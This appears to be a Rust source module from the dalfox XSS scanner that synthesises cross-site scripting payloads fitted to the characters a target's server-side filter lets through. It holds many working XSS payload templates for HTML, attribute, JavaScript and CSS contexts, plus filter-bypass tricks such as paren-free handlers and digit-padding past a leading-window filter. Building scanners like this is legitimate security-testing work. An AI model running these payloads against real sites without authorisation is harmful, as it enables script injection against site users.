//! Filter-constrained generative payload synthesis (issue #1075).
//!
//! Stage 3 active probing records, per parameter, which of the
//! [`crate::parameter_analysis::SPECIAL_PROBE_CHARS`] a server-side filter
//! reflects unchanged (`valid_specials`) versus strips / encodes
//! (`invalid_specials`), together with the [`InjectionContext`] the value lands
//! in. The static payload catalogs ([`crate::payload::get_dynamic_xss_html_payloads`]
//! et al.) can only express shapes written ahead of time, so a custom filter
//! that allows an unusual subset of characters can slip past every catalog
//! entry while still being exploitable with a *constructed* payload.
//!
//! This module turns that probed filter profile into payloads. It assembles a
//! prioritised set of candidate shapes for the detected context, then keeps
//! only the candidates whose every character survives the filter — so the
//! "never emit a blocked character" guarantee falls out of construction rather
//! than being re-checked downstream. Output is ordered by descending confidence
//! (the scan loop is first-hit-wins, so the most likely shapes must come first)
//! and carries the scan's DOM markers so a reflected synthesized payload can
//! promote straight to a verified ([V]) finding.
//!
//! Synthesis is intentionally *small and high-signal*: it runs before the broad
//! catalog and is capped at [`MAX_SYNTHESIZED`]. It augments, never replaces,
//! the catalog — anything synthesis cannot express still gets the full catalog
//! behind it.

use crate::parameter_analysis::{DelimiterType, InjectionContext};

/// Upper bound on synthesized payloads returned for a single (context, filter)
/// pair. Synthesis is meant to be a compact set that runs *before* the full
/// catalog, so this stays well under the catalog size.
const MAX_SYNTHESIZED: usize = 48;

/// JavaScript execution primitives, highest-preference first. Gating happens
/// later via [`FilterProfile::allows_str`], so e.g. the backtick form survives a
/// filter that strips `(` / `)` while the paren forms are dropped, and the
/// `confirm`/`print` alternates survive a denylist on the literal `alert`.
const JS_FUNCS: &[&str] = &["alert(1)", "alert`1`", "confirm(1)"];

/// Leading-window ("positional") filter bypass — see [`positional_pad_payloads`].
///
/// Digit run prepended to a tag payload so the real vector lands past a filter
/// that only entity-encodes / strips a fixed *leading window* of the reflected
/// value. Digits are never in [`crate::parameter_analysis::SPECIAL_PROBE_CHARS`]
/// (always "allowed") and are inert in every HTML context — they cannot form a
/// tag name, close a quote, or start an entity — so the pad shifts the payload's
/// byte offset without changing how the tail parses.
///
/// Two lengths: 24 covers the common small windows (10 / 20) with a compact
/// PoC, 64 covers larger ones. A window wider than the longest pad simply misses
/// (nothing is emitted that could be a false positive).
const POSITIONAL_PAD_LENGTHS: &[usize] = &[24, 64];

/// Minimum leading-digit run that marks a payload as a positional-pad bypass.
/// The shortest [`POSITIONAL_PAD_LENGTHS`] entry is well above this, and no
/// genuine payload begins with this many digits, so it cleanly identifies the
/// pad shape for the raw-angle prune exemption ([`is_positional_pad_bypass`])
/// without a sentinel shared across modules.
const POSITIONAL_PAD_MIN_RUN: usize = 12;

/// Self-firing tag shapes a leading-window angle filter would otherwise defeat.
/// A fresh injected tag carries a `class` marker safely — the duplicate-`class`
/// drop only bites when breaking out of an existing `class="…"` attribute.
const POSITIONAL_PAD_SHAPES: &[&str] = &[
    "<svg onload=alert(1) class={CLASS}>",
    "<img src=x onerror=alert(1) class={CLASS}>",
];

/// What a parameter's server-side filter permits.
struct FilterProfile<'a> {
    invalid: &'a [char],
}

impl<'a> FilterProfile<'a> {
    fn new(invalid: &'a [char]) -> Self {
        Self { invalid }
    }

    /// A character is usable unless active probing positively classified it as
    /// filtered. Characters outside [`crate::parameter_analysis::SPECIAL_PROBE_CHARS`]
    /// (letters, digits, space, `&`, `#`, …) are never probed and are always
    /// assumed usable — markers and tag/handler names are alphanumeric and so
    /// always pass.
    #[inline]
    fn allows(&self, c: char) -> bool {
        !self.invalid.contains(&c)
    }

    /// True when every character of `s` is usable.
    fn allows_str(&self, s: &str) -> bool {
        s.chars().all(|c| self.allows(c))
    }
}

// === Context-specific candidate templates, ordered by descending confidence ===
//
// Placeholders, substituted before the filter pass:
//   {JS}    a JavaScript execution primitive from `JS_FUNCS`
//   {CLASS} the scan's class DOM marker  (enables [V] via class selector)
//   {ID}    the scan's id DOM marker     (enables [V] via id selector)
//
// These are plain `&str` constants (not `format!` templates), so `{{` is NOT an
// escape: `${{JS}}` is the six literal characters `$ { { J S } }`, and
// `replace("{JS}", "alert(1)")` rewrites the inner `{JS}` to yield the template
// literal interpolation `${alert(1)}`.

/// HTML text / element-content context: a tag must be injected, which needs
/// `<` and `>`. When those are filtered every candidate here is dropped and the
/// caller falls back to the catalog (or attribute-context synthesis for values
/// that also echo into an attribute).
const HTML_TEMPLATES: &[&str] = &[
    "<svg onload={JS} class={CLASS}>",
    "<img src=x onerror={JS} class={CLASS}>",
    "<svg/onload={JS}/class={CLASS}>",
    "<details open ontoggle={JS} class={CLASS}>",
    "<svg onload={JS} id={ID}>",
    "<img src=x onerror={JS} id={ID}>",
    "<body onload={JS} class={CLASS}>",
    "<marquee onstart={JS} class={CLASS}>",
    "<video src=x onerror={JS} class={CLASS}>",
    "<script class={CLASS}>{JS}</script>",
    // Marker-less fallbacks ([R] only): useful when the marker attribute name
    // itself is what the filter rejects but a bare tag still lands.
    "<svg onload={JS}>",
    "<img src=x onerror={JS}>",
];

/// Inside an HTML comment (`<!-- … -->`): close the comment, then inject a tag.
const HTML_COMMENT_TEMPLATES: &[&str] = &[
    "--><svg onload={JS} class={CLASS}>",
    "--><img src=x onerror={JS} class={CLASS}>",
    "--!><svg onload={JS} class={CLASS}>",
    "--><svg/onload={JS}/class={CLASS}>",
];

/// Single-quoted attribute value. The "stay-in-tag" event-injection shapes need
/// no `<`/`>`, so they survive angle-stripping filters; the breakout shapes
/// follow for the common case where angles are allowed.
const ATTR_SQ_TEMPLATES: &[&str] = &[
    "' onmouseover={JS} class={CLASS} x='",
    "' autofocus onfocus={JS} class={CLASS} x='",
    "' ontoggle={JS} popover class={CLASS} x='",
    "' onbeforeinput={JS} contenteditable class={CLASS} x='",
    "' onmouseover={JS} id={ID} x='",
    // Paren-free / backtick-free handler, for a filter that strips `(` `)` and
    // backticks — which neutralises every `{JS}` primitive above (`alert(1)`,
    // `` alert`1` ``, `confirm(1)`), so those templates are all char-gated out
    // and this is the only surviving executor. `throw onerror=alert,1` sets
    // `window.onerror = alert` then throws, invoking it with the error;
    // `onerror=alert;throw 1` is the `;`-based mirror for a filter that also
    // strips `,`. Each handler value is quoted (double-quote inside this
    // single-quote breakout) so its inner spaces stay in one attribute, and
    // carries an `id` marker (dup-`class` safe). Verifiable: the value carries
    // the literal `alert` sink token. Not gated on a filter result — when parens
    // survive, the `{JS}` forms above verify first and these are never reached.
    "' onmouseover=\"throw onerror=alert,1\" id={ID} x='",
    "' onmouseover=\"onerror=alert;throw 1\" id={ID} x='",
    // Slash-separated mirrors of the stay-in-tag shapes above, for a server that
    // strips literal spaces from the reflection (which collapses the space-
    // separated shapes into one merged attribute). These are always emitted, not
    // gated on a filter result: space is not in `SPECIAL_PROBE_CHARS`, so the
    // scanner never classifies it blocked — the win comes from the server doing
    // the stripping, not from dalfox detecting it. Two details make them *verify*
    // rather than merely reflect: (1) the handler/marker values are quoted
    // (`onfocus="alert(1)"`). The HTML tokenizer treats `/` as an attribute
    // separator only *after a value has closed* (before-attribute-name /
    // after-attribute-value states); inside a bare unquoted value `/` is
    // appended verbatim. Leading with the breakout quote closes the value it
    // opened, and quoting each inner value closes that value too, so the next
    // `/id=…` starts a fresh attribute instead of being swallowed. (2) The marker
    // is an `id`, not a second `class`, because these breakouts most often land
    // in a pre-existing `class="…"`, and a duplicate `class` attribute is dropped
    // by the parser — which would erase a class marker but never an id.
    "'/onmouseover=\"{JS}\"/id=\"{ID}\"/x='",
    "'/autofocus/onfocus=\"{JS}\"/id=\"{ID}\"/x='",
    "'><svg onload={JS} class={CLASS}>",
    "'><img src=x onerror={JS} class={CLASS}>",
    "'><svg/onload={JS}/class={CLASS}>",
    "'><svg onload={JS} id={ID}>",
];

/// Double-quoted attribute value (mirror of [`ATTR_SQ_TEMPLATES`]).
const ATTR_DQ_TEMPLATES: &[&str] = &[
    "\" onmouseover={JS} class={CLASS} x=\"",
    "\" autofocus onfocus={JS} class={CLASS} x=\"",
    "\" ontoggle={JS} popover class={CLASS} x=\"",
    "\" onbeforeinput={JS} contenteditable class={CLASS} x=\"",
    "\" onmouseover={JS} id={ID} x=\"",
    // Paren-free / backtick-free handler (inner values single-quoted to nest in
    // the double-quote breakout); see the `ATTR_SQ_TEMPLATES` note. The only
    // executor left when a filter strips `(` `)` and backticks.
    "\" onmouseover='throw onerror=alert,1' id={ID} x=\"",
    "\" onmouseover='onerror=alert;throw 1' id={ID} x=\"",
    // Slash-separated mirrors — survive space-stripping filters; see the
    // `ATTR_SQ_TEMPLATES` note for the quoting and `id`-marker reasoning (inner
    // values single-quoted here so they nest inside the double-quote breakout).
    "\"/onmouseover='{JS}'/id='{ID}'/x=\"",
    "\"/autofocus/onfocus='{JS}'/id='{ID}'/x=\"",
    "\"><svg onload={JS} class={CLASS}>",
    "\"><img src=x onerror={JS} class={CLASS}>",
    "\"><svg/onload={JS}/class={CLASS}>",
    "\"><svg onload={JS} id={ID}>",
];

/// Unquoted attribute value: a space starts a new attribute on the same tag, or
/// `>` closes the tag and a fresh tag follows.
const ATTR_UNQUOTED_TEMPLATES: &[&str] = &[
    "x onmouseover={JS} class={CLASS} ",
    "x autofocus onfocus={JS} class={CLASS} ",
    "x ontoggle={JS} popover class={CLASS} ",
    "x onmouseover={JS} id={ID} ",
    "><svg onload={JS} class={CLASS}>",
    "><img src=x onerror={JS} class={CLASS}>",
    // Two space-free additions for a server that strips literal spaces from the
    // reflection (so the space-separated shapes above collapse into one merged
    // attribute). This template set is also the fallback when the delimiter of
    // the value could not be determined, so both must degrade gracefully.
    //
    // 1. A `>`-breakout: inside a *bare* unquoted value `/` is appended verbatim
    //    (it is an attribute separator only once a value has closed), so a
    //    stay-in-tag slash injection cannot work there — close the tag with `>`
    //    and open a fresh, self-contained `<svg>` whose parts are `/`-separated.
    //    Needs angles allowed.
    "><svg/onload={JS}/id={ID}>",
    // 2. A leading `x` plus self-quoted inner values, for the common case where
    //    the delimiter was reported as unknown but the reflection is actually a
    //    *quoted* value (`value="…"`) — including partial-encoding filters that
    //    only touch `<`. The real closing quote ends the value early, and each
    //    quoted `id="…"` then recovers as a clean element id (verified against
    //    `partial-encode`/`multireflect` fixtures). Needs no angles.
    "x/onmouseover=\"{JS}\"/id=\"{ID}\"/",
];

/// URL-bearing attribute value (`href` / `src` / …): the protocol itself
/// executes, no quote breakout required.
const ATTR_URL_TEMPLATES: &[&str] = &["javascript:{JS}", "javascript:{JS}//"];

/// Single-quoted JavaScript string literal.
const JS_SQ_TEMPLATES: &[&str] = &[
    "';{JS}//",
    "'-{JS}-'",
    "'+{JS}+'",
    "');{JS}//",
    "'}};{JS};'",
    "</script><svg onload={JS} class={CLASS}>",
];

/// Double-quoted JavaScript string literal (mirror of [`JS_SQ_TEMPLATES`]).
const JS_DQ_TEMPLATES: &[&str] = &[
    "\";{JS}//",
    "\"-{JS}-\"",
    "\"+{JS}+\"",
    "\");{JS}//",
    "\"}};{JS};\"",
    "</script><svg onload={JS} class={CLASS}>",
];

/// JavaScript template literal (backtick string): `${expr}` evaluates without
/// escaping the surrounding backtick. `${{JS}}` → `${…}` (see header note).
const JS_BACKTICK_TEMPLATES: &[&str] = &[
    "${{JS}}",
    "`;{JS}//",
    "`-{JS}-`",
    "</script><svg onload={JS} class={CLASS}>",
];

/// Inside a JavaScript block comment.
const JS_COMMENT_TEMPLATES: &[&str] = &[
    "*/{JS}/*",
    "*/{JS}//",
    "\n{JS}\n",
    "</script><svg onload={JS} class={CLASS}>",
];

/// Raw JavaScript context (e.g. `var x = INJECT;`): no string to break out of.
///
/// The two `/`-led templates close an enclosing **regex literal** (`var re =
/// /^INJECT$/`) before running the payload: `compute_js_breakout` deliberately
/// treats `/` only as division/comment (never a regex delimiter), so it never
/// emits these — but a reflection inside a regex literal is a real, if uncommon,
/// JS sink. `/;{JS}//` → `…/^/;alert(1)//$/…` (regex `/^/`, then the statement).
const JS_RAW_TEMPLATES: &[&str] = &[
    "{JS}",
    ";{JS};",
    ";{JS}//",
    "/;{JS}//",
    "/;{JS};/",
    "</script><svg onload={JS} class={CLASS}>",
];

/// CSS context with no string delimiter (`<style>…INJECT…</style>`).
const CSS_PLAIN_TEMPLATES: &[&str] = &[
    "</style><svg onload={JS} class={CLASS}>",
    "</style><img src=x onerror={JS} class={CLASS}>",
    "}</style><svg onload={JS} class={CLASS}>",
];

/// CSS context inside a single-quoted value.
const CSS_SQ_TEMPLATES: &[&str] = &[
    "');}</style><svg onload={JS} class={CLASS}>",
    "</style><svg onload={JS} class={CLASS}>",
];

/// CSS context inside a double-quoted value.
const CSS_DQ_TEMPLATES: &[&str] = &[
    "\");}</style><svg onload={JS} class={CLASS}>",
    "</style><svg onload={JS} class={CLASS}>",
];

/// Pick the candidate template set for `context`, ordered by descending
/// confidence.
fn templates_for(context: &InjectionContext) -> Vec<&'static str> {
    match context {
        InjectionContext::Html(Some(DelimiterType::Comment)) => HTML_COMMENT_TEMPLATES.to_vec(),
        InjectionContext::Html(_) => HTML_TEMPLATES.to_vec(),
        InjectionContext::Attribute(delim) | InjectionContext::AttributeUrl(delim) => {
            let mut t: Vec<&'static str> = match delim {
                Some(DelimiterType::SingleQuote) => ATTR_SQ_TEMPLATES.to_vec(),
                Some(DelimiterType::DoubleQuote) => ATTR_DQ_TEMPLATES.to_vec(),
                // Backtick / Comment delimiters aren't meaningful for HTML
                // attribute values; treat them as unquoted.
                _ => ATTR_UNQUOTED_TEMPLATES.to_vec(),
            };
            if matches!(context, InjectionContext::AttributeUrl(_)) {
                t.extend_from_slice(ATTR_URL_TEMPLATES);
            }
            t
        }
        InjectionContext::Javascript(delim) => {
            let mut t = match delim {
                Some(DelimiterType::SingleQuote) => JS_SQ_TEMPLATES.to_vec(),
                Some(DelimiterType::DoubleQuote) => JS_DQ_TEMPLATES.to_vec(),
                Some(DelimiterType::Backtick) => JS_BACKTICK_TEMPLATES.to_vec(),
                Some(DelimiterType::Comment) => JS_COMMENT_TEMPLATES.to_vec(),
                None => JS_RAW_TEMPLATES.to_vec(),
            };
            // The quote-delimiter heuristic only looks for the nearest matching
            // quote, so it mis-classifies a raw JS *expression* position — a
            // template-literal `${ … }` substitution, or an object-literal value
            // slot `{"k": …}` — as a single/double/backtick string. There every
            // string-breakout template is a syntax error, so also offer the
            // bare-expression payload `{JS}` (`alert(1)`), which executes directly
            // in expression position. In a genuine string context it reflects as
            // inert string text and never AST-verifies (promotion requires the
            // injected call to overlap the payload span — see
            // `js_context_verify::has_js_context_evidence`), so this is strictly
            // recall-additive with no false-positive risk.
            if matches!(
                delim,
                Some(
                    DelimiterType::SingleQuote
                        | DelimiterType::DoubleQuote
                        | DelimiterType::Backtick
                )
            ) {
                t.push("{JS}");
            }
            t
        }
        InjectionContext::Css(delim) => match delim {
            Some(DelimiterType::SingleQuote) => CSS_SQ_TEMPLATES.to_vec(),
            Some(DelimiterType::DoubleQuote) => CSS_DQ_TEMPLATES.to_vec(),
            _ => CSS_PLAIN_TEMPLATES.to_vec(),
        },
    }
}

/// Construct filter-constrained payloads for `context` given the characters the
/// parameter's filter blocks (`invalid_specials`) and allows (`valid_specials`).
///
/// Returns a deduplicated, confidence-ordered list (most likely first), capped
/// at [`MAX_SYNTHESIZED`]. Every returned payload is guaranteed to use only
/// characters not present in `invalid_specials`. May return an empty vec when no
/// candidate shape survives the filter (e.g. an HTML-text reflection with `<`
/// stripped) — callers fall back to the catalog.
///
/// Payloads use the default `alert(1)` / `` alert`1` `` execution primitives;
/// `--custom-alert-value` substitution is not applied (consistent with the
/// existing adaptive-payload path, and immaterial to detection since promotion
/// to [V] is marker-based, not alert-value based).
///
/// `escaped_specials` (issue #1072) lists quote characters the server reflects
/// only in backslash-escaped form (`"` → `\"`). For a JS-string context whose
/// delimiter is escaped, synthesis leads with a backslash-prefixed breakout
/// (`\";…`), which the server's own escaping turns into a working string break.
/// `observed_js_breakout` (issue #1073 follow-up) is the exact breakout closer
/// computed from the *real* inline-`<script>` source observed at this
/// parameter's reflection point (see [`crate::parameter_analysis::Param::js_breakout`]).
/// When present for a JS context, synthesis emits the matching breakout *first*
/// — ahead of the fixed depth-0–3 catalog — so a site whose nesting the fixed
/// shells don't cover (deeper or unusual nesting) is still reached. It is
/// strictly additive: the fixed catalog still follows as a fallback, and the
/// observed closer dedupes against it when they coincide.
pub(crate) fn synthesize_payloads(
    context: &InjectionContext,
    invalid_specials: &[char],
    valid_specials: &[char],
    escaped_specials: &[char],
    observed_js_breakout: Option<&str>,
) -> Vec<String> {
    // `valid_specials` is accepted for symmetry with `generate_adaptive_payloads`
    // and forward use (e.g. confidence weighting); gating is expressed purely as
    // "not known-blocked" so that non-probed characters stay usable.
    let _ = valid_specials;

    let profile = FilterProfile::new(invalid_specials);
    let class = crate::scanning::markers::class_marker();
    let id = crate::scanning::markers::id_marker();

    // Candidate templates, highest-confidence first.
    let mut templates: Vec<String> = Vec::new();
    // Issue #1073: for a reflection inside a JS string, lead with nested-closer
    // breakouts (`"]});…`) that escape the open string and any unbalanced
    // `([{` so sinks the bare quote-close cannot reach are still executed.
    // `observed_js_breakout` (when present) is the closer computed from the
    // *real* script prefix at this exact site — the per-parameter carrier
    // follow-up — and is emitted first. The fixed depth-0–3 catalog
    // (`breakout_templates`) always follows as a fallback for sites without an
    // observed prefix, so coverage is strictly additive and the two dedupe when
    // they coincide. Every breakout is gated by `allows_str` below like any
    // other template.
    if let InjectionContext::Javascript(delim) = context {
        let quote = match delim {
            Some(DelimiterType::SingleQuote) => Some('\''),
            Some(DelimiterType::DoubleQuote) => Some('"'),
            Some(DelimiterType::Backtick) => Some('`'),
            Some(DelimiterType::Comment) | None => None,
        };
        // Issue #1073 follow-up: lead with the breakout computed from the real
        // observed script prefix at this exact site, so nesting the fixed shells
        // don't cover is still escaped. Emitted before the catalog (highest
        // confidence) and deduped against it. When the delimiter is one the
        // server backslash-escapes (#1072), prepend a `\` like the escaped
        // catalog set, so the server's own escaping turns our quote into a real
        // string break (`\"]});…` → `\\"]});…` → literal `\` + closing quote).
        if let Some(closer) = observed_js_breakout {
            let escaped = quote.is_some_and(|q| escaped_specials.contains(&q));
            let lead = if escaped { "\\" } else { "" };
            templates.push(format!("{lead}{closer};{{JS}}//"));
        }
        if let Some(q) = quote {
            // Issue #1072: when the server backslash-escapes this delimiter the
            // raw nested breakout is *inert* (`"]});…` → `\"]});…`), so emit the
            // backslash-prefixed nested breakouts instead — the server's escaping
            // converts those into a real string break (`\";…` → `\\";…` → literal
            // `\` + closing quote). Emitting one set (not both raw+escaped) keeps
            // the synthesis cap free for the marker-carrying `</script>` template
            // (which works under escaping regardless). The static `JS_*_TEMPLATES`
            // below still provide the depth-0 forms. A non-escaping delimiter
            // keeps the raw nested set.
            if escaped_specials.contains(&q) {
                templates.extend(crate::payload::js_breakout::escaped_breakout_templates(q));
            } else {
                templates.extend(crate::payload::js_breakout::breakout_templates(q));
            }
        }
    }
    templates.extend(templates_for(context).into_iter().map(String::from));

    let mut out: Vec<String> = Vec::new();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();

    'outer: for template in &templates {
        for func in JS_FUNCS {
            let payload = template
                .replace("{JS}", func)
                .replace("{CLASS}", class)
                .replace("{ID}", id);

            // Filter-constraint guarantee: never emit a payload that uses a
            // character the server's filter strips. This single check is what
            // makes the output "constrained" — construction above is optimistic.
            // (A template carrying no `{JS}` would produce the same string for
            // every `func`; `seen` collapses those duplicates, so no special
            // casing is needed.)
            if profile.allows_str(&payload) && seen.insert(payload.clone()) {
                out.push(payload);
                if out.len() >= MAX_SYNTHESIZED {
                    break 'outer;
                }
            }
        }
    }

    out
}

/// Leading-window ("positional") filter bypass payloads.
///
/// Some server-side filters entity-encode or strip only a fixed *leading window*
/// of the reflected value (e.g. "the first 20 characters are entity-encoded, the
/// rest is raw" or "alphabetic characters in the first 10 are hex-encoded").
/// Active probing places its per-character probe near the start of the value, so
/// such a filter makes the tag-forming characters (`<` / `>`) look
/// unconditionally blocked in `invalid_specials` when they are in fact usable
/// past the window. Both [`synthesize_payloads`] and the broad catalog then obey
/// that (mis)classification and drop every tag payload, so the reflection is
/// missed entirely even though it is exploitable.
///
/// This emits a small, fixed set of *padded* tag payloads: a run of inert digits
/// (see [`POSITIONAL_PAD_LENGTHS`]) followed by a self-firing tag carrying the
/// class marker, so the real vector lands past the leading window. It is only
/// meaningful for an HTML-text reflection, which needs a tag injection — an
/// attribute-context reflection already breaks out angle-free and gains nothing.
///
/// Emitted for **every** HTML-text reflection, not gated on `invalid_specials`,
/// because a leading-window filter is invisible to the per-character probe: the
/// probe places its `<` past the window, so it reflects raw and `<` is recorded
/// *valid* — yet the real payload puts `<` at offset 0, inside the window, where
/// it is encoded. There is thus no filter-profile signal to gate on. The cost is
/// nil on an easily-exploitable parameter: the ordinary tag payloads run first
/// (see the caller's ordering) and the DOM phase stops at the first `[V]`, so
/// these padded variants are only ever *sent* when the plain tags all failed —
/// exactly the positional-filter case they exist for.
///
/// FP-safe by the same DOM-marker verification as everything else: if there is
/// no positional window (an unfiltered param already verified above, or a proper
/// filter encodes `<` everywhere), the padded `<` is either redundant or still
/// encoded, so the marker element never materializes and nothing promotes to
/// `[V]`; the encoded echo is inert and adds no `[R]` either.
///
/// These payloads deliberately carry raw `<` / `>` even when those characters
/// are in `invalid_specials`, so the caller's raw-angle prune must exempt them
/// via [`is_positional_pad_bypass`].
pub(crate) fn positional_pad_payloads(context: &InjectionContext) -> Vec<String> {
    // Only HTML-text reflections need a tag injection; attribute/JS/CSS contexts
    // break out without `<`, so a positional angle filter never blocks them.
    if !matches!(context, InjectionContext::Html(_)) {
        return Vec::new();
    }
    let class = crate::scanning::markers::class_marker();
    let mut out = Vec::with_capacity(POSITIONAL_PAD_LENGTHS.len() * POSITIONAL_PAD_SHAPES.len());
    for &pad_len in POSITIONAL_PAD_LENGTHS {
        let pad = "0".repeat(pad_len);
        for shape in POSITIONAL_PAD_SHAPES {
            out.push(format!("{pad}{}", shape.replace("{CLASS}", class)));
        }
    }
    out
}

/// Whether `payload` is a [`positional_pad_payloads`] leading-window bypass: it
/// begins with a run of at least [`POSITIONAL_PAD_MIN_RUN`] ASCII digits
/// immediately followed by a `<`. The raw-angle prune (which drops any payload
/// carrying a `<`/`>` the filter reports blocked) must keep these — their whole
/// premise is that the block is positional, so the raw `<` *can* pass once the
/// pad pushes it past the window.
pub(crate) fn is_positional_pad_bypass(payload: &str) -> bool {
    let digits = payload.bytes().take_while(u8::is_ascii_digit).count();
    digits >= POSITIONAL_PAD_MIN_RUN && payload.as_bytes().get(digits) == Some(&b'<')
}

#[cfg(test)]
mod tests;
